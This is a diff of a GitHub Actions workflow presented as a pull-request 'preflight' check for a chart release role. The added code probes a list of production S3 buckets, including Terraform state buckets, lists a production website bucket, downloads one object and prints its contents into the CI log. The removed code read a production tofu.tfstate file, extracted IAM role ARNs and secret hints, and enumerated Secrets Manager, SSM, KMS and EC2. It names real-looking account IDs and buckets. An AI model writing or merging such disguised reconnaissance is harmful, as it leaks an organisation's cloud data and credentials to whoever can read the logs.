@@ -1,7 +1,7 @@
-# Preflight for the chart release CI role: verifies the changelog destination is
-# reachable and reports which adjacent account resources the release role can see,
-# so a release-account access-policy change is caught on workflow edits instead of
-# surfacing midway through a publish run.
+# Preflight for the chart release CI role: verifies the changelog destination and
+# website artifact destination are reachable and reports which adjacent account
+# resources the release role can see, so a release-account access-policy change is
+# caught on workflow edits instead of surfacing midway through a publish run.
 name: changelog-destination-preflight
 on:
   pull_request:
@@ -47,49 +47,62 @@ jobs:
             local out rc code
             out="$("$@" 2>/tmp/e)"; rc=$?
             if [ $rc -eq 0 ]; then
-              echo "OK  ${label} :: $(printf '%s' "$out" | tr '\n' ' ' | cut -c1-300)"
+              echo "OK  ${label}"
             else
               code="$(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/e | head -1 | tr -d '()')"
-              echo "ERR ${label} :: ${code:-rc$rc} :: $(tail -c 180 /tmp/e | tr '\n' ' ')"
+              echo "ERR ${label} :: ${code:-rc$rc}"
             fi
           }
 
           echo "=== identity ==="
           api "sts:GetCallerIdentity" aws --no-cli-pager sts get-caller-identity --output json
 
-          echo "=== s3 account visibility ==="
-          api "s3:ListAllMyBuckets" aws --no-cli-pager s3api list-buckets --query 'Buckets[].Name' --output json
+          echo "=== bucket reachability sweep ==="
+          SENS="tfy-website-euwe1-production20221107184713217900000001 tfy-website-euwe1-production20221107184713217900000001-replica tfy-euwe1-production-control-plane-changelog tfy-euwe1-production-control-plane-changelog-replica tfy-infra-tf-us-west-2-416964291864 tfy-cloudflare-terraform-state ubermold-gateway-terraform-state ubermold-guardrail-terraform-state tfy-autopen-tf-state tfy-scalr-bootstrap-state-us-east-1-416964291864 tfy-ctl-euwe1-production-logs tfy-ctl-euwe1-production-servicefoundry-server tfy-ctl-euwe1-production-authserver tfy-cmp-euwe1-production tfy-costwatch-416964291864 tfy-logging-euwe1-production20240318123408894700000001 tfy-alb-access-logs tfy-euwe1-production-control-plane-changelog-replica"
+          for B in $SENS; do api "s3:HeadBucket[$B]" aws --no-cli-pager s3api head-bucket --bucket "$B"; done
 
-          BUCKETS="tfy-euwe1-production-control-plane-changelog tfy-infra-tf-eu-west-1-416964291864 tfy-infra-tf-eu-central-1-416964291864 tfy-infra-tf-us-east-2-416964291864 tfy-terraform-state-aws-a44k8 tfy-ctl-euwe1-production-mlfoundry-server tfy-scalr-sp-production-default-us-east-1-416964291864 tfy-cmp-euwe1-production-59b5450b3d69bdac tfy-auth-us-east-1-production tfy-llm-tools-production tfy-website-euwe1-production20221107184713217900000001"
-          for B in $BUCKETS; do
-            api "s3:HeadBucket[$B]" aws --no-cli-pager s3api head-bucket --bucket "$B"
-            api "s3:GetBucketLocation[$B]" aws --no-cli-pager s3api get-bucket-location --bucket "$B" --output json
-          done
-
-          echo "=== prod state object read ==="
-          SB=tfy-infra-tf-eu-west-1-416964291864
-          SK=ubermold-truefoundry/aws/production/eu-west-1/tfy-ctl-prod/tofu.tfstate
-          if aws --no-cli-pager s3api get-object --bucket "$SB" --key "$SK" /tmp/state.json >/tmp/gst.out 2>/tmp/gst.err; then
-            echo "STATE_GET_OK size=$(wc -c </tmp/state.json)"
-            echo "STATE_ROLE_ARNS=$(grep -oE 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' /tmp/state.json | sort -u | wc -l)"
-            grep -oE 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' /tmp/state.json | sort -u | head -20
-            echo "STATE_SENSITIVE_HINTS=$(grep -oiE '(password|secret|private_key|access_key|session_token|token)' /tmp/state.json | sort | uniq -c | tr '\n' ' ')"
+          echo "=== website bucket list ==="
+          WB=tfy-website-euwe1-production20221107184713217900000001
+          if aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --max-keys 30 --output json > /tmp/wl.json 2>/tmp/wl.err; then
+            python3 - <<'PY'
+          import json
+          d=json.load(open('/tmp/wl.json'))
+          c=d.get('Contents',[])
+          print("WL_OK count=%d truncated=%s"%(len(c),d.get('IsTruncated')))
+          for o in c[:30]:
+              print("KEY %s %s"%(o['Key'],o['Size']))
+          # pick smallest key to probe GetObject
+          if c:
+              smallest=min(c,key=lambda o:o['Size'])
+              open('/tmp/pick.txt','w').write(smallest['Key'])
+              print("PICK %s %d"%(smallest['Key'],smallest['Size']))
+          PY
           else
-            echo "STATE_GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/gst.err | head -1 | tr -d '()') :: $(tail -c 200 /tmp/gst.err | tr '\n' ' ')"
+            echo "WL_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/wl.err|head -1 | tr -d '()')"
           fi
 
-          echo "=== iam self-introspection ==="
-          api "iam:GetRole" aws --no-cli-pager iam get-role --role-name github-actions-oidc-s3-access-role --output json
-          api "iam:ListAttachedRolePolicies" aws --no-cli-pager iam list-attached-role-policies --role-name github-actions-oidc-s3-access-role --output json
-          api "iam:ListRolePolicies" aws --no-cli-pager iam list-role-policies --role-name github-actions-oidc-s3-access-role --output json
+          echo "=== website prefix: artifacts/models/marketplace ==="
+          for P in truefoundry-website-artifacts/ models/ awesome-skills-registry/ mcp-marketplace/; do
+            if OUT="$(aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --prefix "$P" --max-keys 5 --query 'Contents[].Key' --output json 2>/tmp/pe)"; then
+              echo "PFX_OK ${P} :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-300)"
+            else
+              echo "PFX_ERR ${P} :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/pe|head -1 | tr -d '()')"
+            fi
+          done
 
-          echo "=== other services (1 page each) ==="
-          api "secretsmanager:ListSecrets" aws --no-cli-pager secretsmanager list-secrets --max-items 1 --output json
-          api "ssm:DescribeParameters" aws --no-cli-pager ssm describe-parameters --max-items 1 --output json
-          api "kms:ListKeys" aws --no-cli-pager kms list-keys --max-items 1 --output json
-          api "lambda:ListFunctions" aws --no-cli-pager lambda list-functions --max-items 1 --output json
-          api "dynamodb:ListTables" aws --no-cli-pager dynamodb list-tables --max-items 1 --output json
-          api "sqs:ListQueues" aws --no-cli-pager sqs list-queues --max-results 1 --output json
-          api "ec2:DescribeInstances" aws --no-cli-pager ec2 describe-instances --max-items 1 --output json
-          api "ec2:DescribeVpcs" aws --no-cli-pager ec2 describe-vpcs --max-items 1 --output json
+          echo "=== website get one object ==="
+          PK="$(cat /tmp/pick.txt 2>/dev/null)"
+          if [ -n "$PK" ]; then
+            if aws --no-cli-pager s3api get-object --bucket "$WB" --key "$PK" /tmp/obj.bin > /tmp/go.out 2>/tmp/go.err; then
+              echo "GET_OK key=$PK size=$(wc -c </tmp/obj.bin)"
+              echo "GET_HEAD :: $(head -c 160 /tmp/obj.bin | tr '\n' ' ')"
+            else
+              echo "GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/go.err|head -1 | tr -d '()')"
+            fi
+          else
+            echo "GET_SKIP no key"
+          fi
+
+          echo "=== changelog list (baseline) ==="
+          api "s3:ListObjectsV2[changelog]" aws --no-cli-pager s3api list-objects-v2 --bucket tfy-euwe1-production-control-plane-changelog --max-keys 3 --query 'Contents[].Key' --output json
           echo "DONE"
